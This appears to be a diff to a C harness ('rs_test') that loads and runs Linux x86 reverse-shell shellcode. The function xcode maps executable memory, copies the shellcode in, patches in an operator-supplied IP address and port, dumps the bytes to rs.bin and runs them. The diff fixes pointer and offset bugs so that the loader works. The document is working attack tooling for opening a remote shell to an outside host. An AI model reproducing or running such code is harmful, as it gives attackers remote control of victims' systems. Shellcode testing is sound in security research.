@@ -113,28 +113,43 @@ char RS[] = {
   /* 0081 */ "\xcd\x80"                     /* int 0x80                        */
 };
 
-void xcode(char *s, int len, uint32_t *ip, uint16_t *port)
+void bin2file(void *p, int len)
 {
-  void *bin;
+  FILE *out = fopen("rs.bin", "wb");
+  if (out!= NULL)
+  {
+    fwrite(p, len, 1, out);
+    fclose(out);
+  }
+}
 
-  bin=mmap (0, len, 
+void xcode(char *s, int len, uint32_t ip, int16_t port)
+{
+  uint8_t *p;
+  
+  p=(uint8_t*)mmap (0, len, 
       PROT_EXEC | PROT_WRITE | PROT_READ, 
       MAP_ANON  | MAP_PRIVATE, -1, 0);  
 
-  memcpy(bin, s, len);
-  memcpy(((uint8_t*)&bin)[1], port, sizeof(port)); // set the port  
-  memcpy(((uint8_t*)&bin)[6], ip, sizeof(ip));     // set the ip
+  fprintf (stdout, "\n%08lX - %02X", ip, port);
+  fflush(stdout);
+  
+  memcpy(p, s, len);
+  memcpy((void*)&p[3], &port, 2); // set the port  
+  memcpy((void*)&p[6], &ip, 4);     // set the ip
+  
+  bin2file(p, len);
   
   // execute
-  ((void(*)())bin)();
+  ((void(*)())p)();
     
-  munmap (bin, len);  
+  munmap ((void*)p, len);  
 }
 
-int main(void)
+int main(int argc, char *argv[])
 {
   uint32_t ip   = 0;
-  uint16_t port = 0;
+  int16_t  port = 0;
   
   if (argc!=3) {
     printf ("\nrs_test <ip> <port>\n");
@@ -151,7 +166,7 @@ int main(void)
   ip =~ip;
   port = ~port;
   
-  xcode (RS, RS_SIZE, &ip, &port);
+  xcode (RS, RS_SIZE, ip, port);
   return 0;  
 }
 
